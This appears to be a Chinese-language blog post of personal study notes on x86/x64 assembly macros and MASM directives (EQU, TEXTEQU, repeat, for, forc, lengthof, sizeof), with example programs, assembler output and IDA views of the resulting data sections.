(C) Microsoft Corp 1981-1997. All rights reserved. Assembling: x.asm***********ASCII build***********The arr contains (SIZEOF arr) bytesThe arr contains %(SIZEOF arr) bytesThe arr contains 9 bytes Link /subsystem:windows x.objMicrosoft (R) Incremental Linker Version 5.12.8078Copyright (C) Microsoft Corp 1992-1998. All rights reserved. 例子2 代码的功能就是实现 val3 &#x3D; val1 * val2 里面有个检测 我们都知道乘法的eax是作为第一个因素的,不能作为第二个 所以这里有个检测 正确的代码,输出结果无 1234567891011121314151617181920212223242526272829303132333435363738include Dqx.incMUL32 MACRO op1, op2, product\tifidni &lt;op2&gt;,&lt;eax&gt; line_Num TEXTEQU %(@LINE) ECHO xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx% ECHO * Error on line line_Num: EAX cannot be as the second var ECHO * argument when invoking the MUL32 macro. ECHO xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\texitm\t;\tendif\tpush eax\tmov eax,op1\tmul op2\tmov product,eax\tpop eaxENDM;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data\tval1 DWORD 3val2 DWORD 2result DWORD ? ;--------------------------------------------------------.codestart: ;MUL32 val1,val2,result ; val3 = val1 * val2\tmov eax,val1\tMUL32 eax,val2,result invoke\tExitProcess,NULLend start;----------------------------------------------------- 错误的代码,把eax作为了第二个参数 123456789101112131415161718192021222324252627282930313233343536373839include Dqx.incMUL32 MACRO op1, op2, product\tifidni &lt;op2&gt;,&lt;eax&gt; line_Num TEXTEQU %(@LINE) ECHO xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx% ECHO * Error on line line_Num: EAX cannot be as the second var ECHO * argument when invoking the MUL32 macro. ECHO xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\texitm\t;exit会退出所有的宏定义,意思就是下面的语句不再执行\t;虽然我们可以通过elseif来不执行\tendif\tpush eax\tmov eax,op1\tmul op2\tmov product,eax\tpop eaxENDM;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data\tval1 DWORD 3val2 DWORD 2result DWORD ? ;--------------------------------------------------------.codestart: ;MUL32 val1,val2,result ; val3 = val1 * val2\tmov eax,val1\tMUL32 val2,eax,result invoke\tExitProcess,NULLend start;----------------------------------------------------- 输出 12345678910111213141516171819202122Microsoft (R) Program Maintenance Utility Version 14.31.31105.0Copyright (C) Microsoft Corporation. All rights reserved. ml /c /coff x.asmMicrosoft (R) Macro Assembler Version 6.14.8444Copyright (C) Microsoft Corp 1981-1997. All rights reserved. Assembling: x.asm***********ASCII build***********x.asm(36) : error A2006: undefined symbol : @LINE MUL32(2): Macro Called From x.asm(36): Main Line Codexxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx* Error on line 0: eax cannot be as the second var* argument when invoking the MUL32 macro.xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxNMAKE : fatal error U1077: &#x27;D:\\Back\\C0de_IDE\\Asm\\x86\\masm32\\bin\\ml.EXE&#x27; : return code &#x27;0x1&#x27;Stop. &lt; &gt; 文字文本替换符他会把&lt;&gt;里的内容当做一个文本的整体导入,这个文本不是浅层意义字符串,而是xxx,就像你现在打的字 123456789101112131415161718192021include Dqx.incmake macro t_str\tlocal t_name\t.data t_name byte t_str,0\t.code mov esi,offset t_nameendm;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data ;--------------------------------------------------------.codestart: make &quot;I am here&quot;,0Dh,0Ah make &lt;&quot;I am there&quot;,0Dh,0Ah&gt; invoke\tExitProcess,NULLend start;----------------------------------------------------- 0Dh是回车,0Ah是换行 第一个语句看似像给str传入”I am here”,0Dh,0Ah,但是被识别为3个参数,编译器发出警告,然后舍弃最后2个参数 12x.asm(17) : warning A4006: too many arguments in macro call make(1): Macro Called From 然后第二种写法才是把他们当做一个整体写入 IDA 1234.data:00403000 aIAmHere db &#x27;I am here&#x27;,0 ; DATA XREF: start↑o.data:0040300A aIAmThere db &#x27;I am there&#x27;,0Dh,0Ah,0.data:0040300A ; DATA XREF: start+5↑o.data:00403017 align 1000h ! 强制处理运算符在C语言里面我们有转移字符 好比 转义为换行 在masm里面,!的作用好比这个 多的也不说,感觉没怎么用 宏循环while看代码会更加的清晰 一个斐波拉契数列,后一项是前2项的sum 123456789101112131415161718192021include Dqx.inc;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data\tx=1y=1byte xbyte yz=x+ywhile z LT 10\tbyte z\tx=y\ty=z\tz=x+yendm;--------------------------------------------------------.codestart: invoke\tExitProcess,NULLend start;----------------------------------------------------- 他的效果是个啥???? 首先我们创建了2个变量,x和y 然后利用循环不断的创建z变量 最后在data区我们得到了 123456789.data:00403000 ;org 403000h.data:00403000 db 1.data:00403001 db 1.data:00403002 db 2.data:00403003 db 3.data:00403004 db 5.data:00403005 db 8.data:00403006 db 0.data:00403007 db 0 repeat与dup类似 它适用于有一定次数的循环 用法是 123repeat 循环次数\txxxendm 1234567891011121314151617181920212223242526272829303132include Dqx.inc;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data\tcount=10xy\tstruct\tx byte 10h\ty byte 23hxy\tendszq\tstruct\tz byte 34h\tq byte 56hzq\tendsxyzq\tstruct\trepeat count\tlocal b_xy,b_zq\tb_xy xy &lt;&gt;\tb_zq zq &lt;&gt;\tendmxyzq\tendsone xyzq &lt;&gt;;--------------------------------------------------------.codestart: invoke\tExitProcess,NULLend start;----------------------------------------------------- 在data区的效果,创建了10个xy,zq的变量 12345678910111213141516171819202122232425262728293031323334353637383940414243.data:00403000 ;org 403000h.data:00403000 db 10h.data:00403001 db 23h ; #.data:00403002 db 34h ; 4.data:00403003 db 56h ; V.data:00403004 db 10h.data:00403005 db 23h ; #.data:00403006 db 34h ; 4.data:00403007 db 56h ; V.data:00403008 db 10h.data:00403009 db 23h ; #.data:0040300A db 34h ; 4.data:0040300B db 56h ; V.data:0040300C db 10h.data:0040300D db 23h ; #.data:0040300E db 34h ; 4.data:0040300F db 56h ; V.data:00403010 db 10h.data:00403011 db 23h ; #.data:00403012 db 34h ; 4.data:00403013 db 56h ; V.data:00403014 db 10h.data:00403015 db 23h ; #.data:00403016 db 34h ; 4.data:00403017 db 56h ; V.data:00403018 db 10h.data:00403019 db 23h ; #.data:0040301A db 34h ; 4.data:0040301B db 56h ; V.data:0040301C db 10h.data:0040301D db 23h ; #.data:0040301E db 34h ; 4.data:0040301F db 56h ; V.data:00403020 db 10h.data:00403021 db 23h ; #.data:00403022 db 34h ; 4.data:00403023 db 56h ; V.data:00403024 db 10h.data:00403025 db 23h ; #.data:00403026 db 34h ; 4.data:00403027 db 56h ; V.data:00403028 db 0.data:00403029 db 0 for 循环取整数语法 123for name,&lt;name1,name2,name3&gt;\txxendm 看例子 12345678910111213141516171819202122232425262728293031include Dqx.inc;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data\tcount=10xy\tstruct\tx byte 55h\ty byte 66hxy\tendsfor b_name,&lt;one,two,three,four,five,six&gt; b_name xy &lt;&gt;endmfor b_value,&lt;97,98,99,100,101,102&gt;\tlocal b_name\tb_name byte b_valueendm;for b_value,&#123;&lt;97,98&gt;,&lt;99,100&gt;,&lt;101,102&gt;&#125;\t;local b_name\t;b_name xy b_value;endm;--------------------------------------------------------.codestart: invoke\tExitProcess,NULLend start;----------------------------------------------------- 最后在IDA的DATA区域得到的数据 12345678910111213141516171819202122232425data:00403000 ;org 403000h.data:00403000 db 55h ; U.data:00403001 db 66h ; f.data:00403002 db 55h ; U.data:00403003 db 66h ; f.data:00403004 db 55h ; U.data:00403005 db 66h ; f.data:00403006 db 55h ; U.data:00403007 db 66h ; f.data:00403008 db 55h ; U.data:00403009 db 66h ; f.data:0040300A db 55h ; U.data:0040300B db 66h ; f.data:0040300C db 61h ; a.data:0040300D db 62h ; b.data:0040300E db 63h ; c.data:0040300F db 64h ; d.data:00403010 db 65h ; e.data:00403011 db 66h ; f.data:00403012 db 0.data:00403013 align 1000h.data:00403013 _data ends.data:00403013.data:00403013.data:00403013 end start forc 循环取字符与上一个例子类似 语法 123forc &lt;无双引号的字符串&gt;\txxendm 例子 1234567891011121314include Dqx.inc;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data\tforc code,&lt;!@#$%^&amp;*!&gt;!&lt;&gt; byte &quot;&amp;code&quot;endm;--------------------------------------------------------.codestart: invoke\tExitProcess,NULLend start;----------------------------------------------------- 在IDA的data区域 123.data:00403000 ;org 403000h.data:00403000 db &#x27;@#$%^&amp;*&gt;&lt;&#x27;,0.data:0040300A align 1000h REQ不知道什么鬼 12345678910111213141516include Dqx.incm_ok\tmacro var1:REQ,var2:REQ mov al,var1 mov bl,var2\tendm;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data .code ;--------------------------------------------------------start: m_ok 97,98 invoke\tExitProcess,NULLend\tstart;----------------------------------------------------- ECHO不知道什么鬼 1234567891011121314151617181920include Dqx.incm_ok\tmacro var1:REQ,var2:REQ ECHO hello,I am link and masm mov al,var1 mov bl,var2 endm;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data .code ;--------------------------------------------------------start: m_ok 97,98 ECHO hello,I am Dqx_Gh0st invoke\tExitProcess,NULLend\tstart;----------------------------------------------------- ECHO的效果就是在输出字符串,不过在运行时不会输出 123456789101112131415161718Microsoft (R) Program Maintenance Utility Version 14.31.31105.0Copyright (C) Microsoft Corporation. All rights reserved. ml /c /coff x.asmMicrosoft (R) Macro Assembler Version 6.14.8444Copyright (C) Microsoft Corp 1981-1997. All rights reserved. Assembling: x.asm***********ASCII build***********hello,I am link and masmhello,I am Dqx_Gh0st Link /subsystem:windows x.objMicrosoft (R) Incremental Linker Version 5.12.8078Copyright (C) Microsoft Corp 1992-1998. All rights reserved. 于是上面那里就输出了hello,I am Dqx_Gh0st 但是运行x.exe是不会有输出的,就连调试也不会 x64宏1234567891011121314151617181920212223242526272829303132; macro.asmextern printf%define\tdouble_it(r)\tsal r, 1\t;这里带有参数%macro\tprntf\t2 ;2代表了2个参数,参数1是%1,参数2是%2\tsection .data %%arg1\tdb\t%1,0 ; first argument %%fmtint\tdb\t&quot;%s %ld&quot;,10,0 ; formatstring\tsection .text ; the printf arguments mov\trdi, %%fmtint mov\trsi, %%arg1 mov\trdx,[%2] ; second argument mov\trax,0 ; no floating point call printf%endmacrosection .data number\tdq\t15 section .bsssection .text global main main:\tpush rbp\tmov rbp,rsp\tprntf &quot;The number is&quot;, number\tmov rax, [number]\tdouble_it(rax)\tmov [number],rax\tprntf &quot;The number times 2 is&quot;, number\tleave\tret 单行宏以%define开头 1%define\tdouble_it(r)\tsal r, 1\t;这里带有参数 这个r是参数 根据寄存器的约束[见内联汇编扩展篇] 这个r的意思应该是任意寄存器的意思,也就是传入的参数可以使任意寄存器 多行宏用%macro与%endmacro来包含 包含了宏的名字,参数个数 局部变量用%%开头,其实也不是非要用 这个的意思就是local差不多的意思…保证参数的名字不会重复 12%%arg1%%fmtint 参数用% 12%1 代表了第一个参数%2 代表了第二个参数 1234567891011%macro\tprntf\t2 ;2代表了2个参数,参数1是%1,参数2是%2\tsection .data %%arg1\tdb\t%1,0 ; first argument %%fmtint\tdb\t&quot;%s %ld&quot;,10,0 ; formatstring\tsection .text ; the printf arguments mov\trdi, %%fmtint mov\trsi, %%arg1 mov\trdx,[%2] ; second argument mov\trax,0 ; no floating point call printf%endmacro 链表第一次尝试第一次尝试,失败 还不知道为什么 关于书上的例子 123456789101112131415161718192021222324..........; 数据段.data;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;node struct\tnum\tdd ?\tnext\tWNDCLASS\t&lt;&gt;node endsx\tnode\t&lt;20,&gt;;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;; 代码段.code;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;\tstart: xor eax,eax mov esi,offset x assume esi: ptr node mov eax,[esi].next.lpfnWndProc assume esi:nothing..... 失败了,不知道为什么…. 反正我写就是报错 12345678910111213141516171819202122232425.data;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;node struct\tnum\tdd ?\tnext\tdd &lt;&gt;node endsx\tnode\t&lt;20,offset y&gt;y\tnode\t&lt;10,offset x&gt;;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;; 代码段.code;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;\tstart: xor\teax,eax mov\tesi,offset x assume\tesi: ptr node mov\teax,[esi].next.num assume\tesi:nothing push 0 call ExitProcess;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; 第二次尝试123456789101112131415161718192021222324252627282930313233343536include Dqx.inc;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data\tnode\tstruct\tvalue dword\t6\tnext_ptr\tdword\t6node\tendscount=0train_head\tlabel\tptr noderepeat\t5\tcount=count+1\tnode &lt;,$+count*(type node)&gt;\tendmtrain_tail label ptr nodenode &lt;0,0&gt;;--------------------------------------------------------.codestart: mov\tesi,train_head mov\tedi,train_tailcheck_continue: mov\tecx,(node ptr [esi]).next_ptr cmp\tecx,0 je\tover add\tesi,type node jmp\tcheck_continue\tover: echo\ti find it invoke\tExitProcess,NULLend start;----------------------------------------------------- 代码的作用是 建立5个链表 建立一个尾巴链表,他的next指针为null 然后查询链表,查到就退出 IDA的data区 1234567891011121314.data:00403000 ;org 403000h.data:00403000 dword_403000 dd 6 ; DATA XREF: start↑r.data:00403004 dd offset dword_403008.data:00403008 dword_403008 dd 6 ; DATA XREF: .data:00403004↑o.data:0040300C dd offset dword_403010.data:00403010 dword_403010 dd 6 ; DATA XREF: .data:0040300C↑o.data:00403014 dd offset dword_403018.data:00403018 dword_403018 dd 6 ; DATA XREF: .data:00403014↑o.data:0040301C dd offset dword_403020.data:00403020 dword_403020 dd 6 ; DATA XREF: .data:0040301C↑o.data:00403024 dd offset dword_403028.data:00403028 dword_403028 dd 0 ; DATA XREF: start+6↑r.data:00403028 ; .data:00403024↑o.data:0040302C dd 0 低频real&lt;&lt;汇编语言基于x86处理器&gt;&gt;的Page56 里面有个real实数类型…也就是浮点数的意思 BCD还有一个BCD编码 &lt;&lt;汇编语言基于x86处理器&gt;&gt;的Page61 label 数据类型用法 1b_var label word 变量b_var的值就是紧挨着下一个word类型变量的地址 它指向一个word的数据类型 编译器也不会给label类型分配内存,它会与下一个数据共享一个位置 于是我们就可以不用offset了 12345678910111213141516171819.386.MODEL flat,stdcallExitProcess PROTO, dwExitCode:DWORD .data\tarr_label label word;IDA不会出现这句话\tarr dd 12345678h;arr的低4位地址的数据与arr_label共享.codemain PROC xor eax,eax\tmov ax,arr_label;直接使用名字可以访问指针指向的值\txor eax,eax\tmov ax,[arr_label+1]\tINVOKE\tExitProcess,0;调用结束的函数,;--------------------------------------------------------------------------- main ENDPEND main 1mov ax,arr_label;直接使用名字可以访问指针指向的值 因为arr_label指向word,所以我们用ax|16位来接收,只能接收12345678h的低位4字节 1mov ax,[arr_label+1] +1是字节+1 12345678h的低位[1]开始于是获取了3456h","tags":["Assembly","x86"],"categories":["Language"]},{"title":"x86汇编语言实践部分","path":"/re4mile/2021/06/07/language/Asm/windwos/32/指令/language/","content":"常用指令系统x64 汇编网 https://www.felixcloutier.com/x86/index.html 伪指令伪指令在编译阶段起作用 没有对应的机器码 \\ 换行符 连接上一句如 123456invoke\tMessageBox,\t\\NULL, \\offset A_Text, \\offset A_Title, \\MB_OKinvoke\tExitProcess,NULL \\它的作用是连接上一句,使之成为一个整体 等效于 1invoke\tMessageBox, NULL, offset A_Text, offset A_Title, MB_OK 段指令.code .data .data? .const .code这些事分段的伪指令 123456789101112131415161718.386.model flat ,stdcalloption casemap :none&lt;一些include指令&gt;.stack&lt;堆栈的大小&gt;.data&lt;一些初始化过的变量定义&gt;.data?&lt;一些没有被初始化过的变量定义&gt;.const&lt;一些常量的定义&gt;.code&lt;代码&gt;&lt;开始标号&gt;其它语句end&lt;开始标号&gt; 就书上的东西而言 x86下 .data .data? .const .data?&lt;一些没有被初始化过的变量定义&gt; 在内存分配时,他们不占空间,编译器只是会记录这个位置区域的大小,而真正的使用它会在另外一个空间空间开辟 .const&lt;一些常量,好比字符串,整形数据&gt; 可读不可写的常量区,如果写到这里来就会报错然后退出 x64下 .bss存放一些没有没有初始化的变量,不包含任何数值, 在编译阶段不会占据内存,在执行时像操作系统请求所需的内存,并初始化为0 如果执行时,没有足够的内存分配,程序会崩溃 一个例子,不是很理解 12section .bssflist\tresb 11 于是就表示了filst是一个11字节的字符串 有一些这些类型 1234resb 8位resw 16位resd 32位resq 64位 声明一个数组 arr resd 20 还有一个例子就是 scanf的缓冲区与是放在.bss区域 代码段放在了text节区 一般代码段时不可读不可写的,但是修改一些属性就可以 栈段书上说斩断时可读可写可执行的,woc???所以黑客攻击栈段????? equ 相等EQU可以与C语言的define做一个比较 EQU相关的数据,内存不会给他分配空间 凡是遇到EQU定义的数据,系统就给你自动替换为了相应的字面量 3种情况 左值 EQU 右值 说明 dqx EQU &lt;“I am Dqx_Gh0st”,0&gt;或者&lt;1024*2&gt; 凡是遇到Dqx就用相应的字符串或者数值替代 xx EQU symble xxx EQU 表达式 既然与Define做了一个比较,那么的话define定义的都是常量,是不可以再次赋值的 123456789101112131415161718;------------------------------------------------------------------------Just_A_Ejd EQU &lt;&quot;Pess and key to continue...&quot;,0&gt;Just_A_Var EQU &lt;100*100&gt;.386.MODEL flat,stdcallExitProcess PROTO, dwExitCode:DWORD .data\tArr db 1,2,3,4,5,6,7,8,9,10\tlen dd $-Arr.codemain PROC mov eax,Just_A_Var\tINVOKE\tExitProcess,0;调用结束的函数,;--------------------------------------------------------------------------- main ENDPEND main 在IDA里面 12345sub_402028 proc nearmov eax, 10000push 0 ; uExitCodecall j_ExitProcesssub_402028 endp Just_A_Var被替换为了100*100 其实也不是这样 Just_A_Var会被替换位100*100,而不是100000 毕竟是一个字符串的替换,而不是u直接算出结果 textequ 文本相等与EQU类似 name textEQU &lt;指令表达式或者带“”的字符串&gt; name textEQU 已经被创建的EQU宏 name textEQU %数值 例子 1234567891011121314151617;------------------------------------------------------------------------x=20num TEXTEQU %(x*10)move TEXTEQU &lt;mov&gt;init_ax TEXTEQU &lt;move ax,num&gt;(略).codemain PROC init_ax\tINVOKE\tExitProcess,0;调用结束的函数,;--------------------------------------------------------------------------- main ENDPEND main 在IDA里面 123456sub_402028 proc nearmov ax, 200push 0 ; uExitCodecall j_ExitProcesssub_402028 endp 如果我用EQU 12345x=20num TEXTEQU %(x*10)move EQU &lt;mov&gt;init_ax EQU &lt;move ax,num&gt; 在IDA里面可以得到一样的结果 @@ 地址标号@@ 是当前的地址 @F会指向下一个最近的@@ @B会指向下上一个最近的@@ 遵循就近原则 123456\tjmp @F@@:\tinvoke\tMessageBox, NULL, offset A_Text, offset A_Title, MB_OK\tjmp @B 实现一个死循环 type 获取数据类型的大小1234567891011121314151617include Dqx.inc\t.datavar dword ?.codestart: xor eax,eax mov eax,type var\tmov eax,type start\tmov eax,type near\tmov eax,type far\tINVOKE\tExitProcess,0;调用结束的函数,;--------------------------------------------------------------------------- end start IDA 1234567891011public startstart proc nearxor eax, eaxmov eax, 0FF04hmov eax, 0FF04hmov eax, 0FF06hmov eax, 4push 0 ; uExitCodecall ExitProcessstart endp 关于,start与near,far的标号值是固定的 lengthof 计算数组元素的个数相比于C语言, 如果是整数数组,它的功能就是sizeof(arr)/sizeof(arr[0]) 如果是字符串数组,它的功能就是strlen(str) 它会返回一个32位的数值 关于细节 1234567891011121314151617181920212223242526272829;------------------------------------------------------------------------.386.MODEL flat,stdcallExitProcess PROTO, dwExitCode:DWORD .data\tarr1 db 1,2,3,4 db 5,6,7,8\tptr_arr dd arr1\tarr2 dw 1,2,3,4, 5,6,7,8\tptr_arr2 dd arr2.codemain PROC xor eax,eax\tmov eax,lengthof arr1;我感觉offset的就像C语言的取地址运算符&amp;\txor eax,eax\tmov eax,lengthof arr2\t;mov eax,lengthof ptr_arr2\tINVOKE\tExitProcess,0;调用结束的函数,;--------------------------------------------------------------------------- main ENDPEND main IDA源码 123456789sub_402028 proc nearxor eax, eaxmov eax, 4xor eax, eaxmov eax, 8push 0 ; uExitCodecall j_ExitProcesssub_402028 endp ①. 123arr1 db 1,2,3,4 db 5,6,7,8ptr_arr dd arr1 第2行与第1行没有关系 lengthof&#x3D;4 123arr1 db 1,2,3,4, db 5,6,7,8ptr_arr dd arr1 这样写会报错 ,逗号的意思…..你可以看作第一行与第二行之间有很多的空格,那个逗号就是连接的 报错的原有? 这么看 1arr1 db 1,2,3,4 ,db 5,6,7,8 这样当然会报错 1arr1 db 1,2,3,4 db 5,6,7,8 这样就不会报错 但是第二个db和第一个db就不不再有联系了(对于lengthof)的话 sizeof&#x2F;size 返回数组的总字节数可以形象的比喻它为 type x lengthof 数组单元个数x每个单元的字节数 123456789101112131415161718include Dqx.inc\t.datavar dword ?arr word 4 dup(0).codestart: xor eax,eax mov eax,size var\tmov eax,sizeof var\tmov eax,size arr\tmov eax,sizeof arr\tINVOKE\tExitProcess,0;调用结束的函数,;--------------------------------------------------------------------------- end start IDA 12345678910public startstart proc nearxor eax, eaxmov eax, 4mov eax, 4mov eax, 8mov eax, 8push 0 ; uExitCodecall ExitProcessstart endp 使用情况 12arr1 db &quot;hello,I am dqx_Gh0st&quot;,0arr2 db sizeof arr1 dup(0) 